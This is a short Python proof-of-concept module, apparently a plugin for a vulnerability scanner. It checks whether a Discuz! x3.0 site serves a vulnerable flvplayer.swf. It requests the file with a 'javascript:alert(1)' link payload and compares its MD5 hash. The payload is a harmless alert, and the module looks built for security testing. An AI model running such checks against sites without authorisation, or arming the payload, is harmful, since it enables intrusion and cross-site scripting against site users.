#!/usr/bin/env python
# -*- coding:utf-8 -*-

import hashlib
from lib import logger
from lib import requests

author = "Chu <root@sh3ll.me>"
scope = "Discuz! x3.0"
description = "/static/image/common/flvplayer.swf Flash XSS"
reference = "http://www.ipuman.com/pm6/138/"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]


def exploit(URL):
    url = URL + "/static/image/common/flvplayer.swf?file=1.flv&" \
                "linkfromdisplay=true&link=javascript:alert(1);"
    logger.process("Requesting target site")
    r = requests.get(url, timeout=5)
    r.close()
    if hashlib.md5(r.content).hexdigest() == "7d675405ff7c94fa899784b7ccae68d3":
        logger.success("Exploitable!")
        logger.success(url)
        return url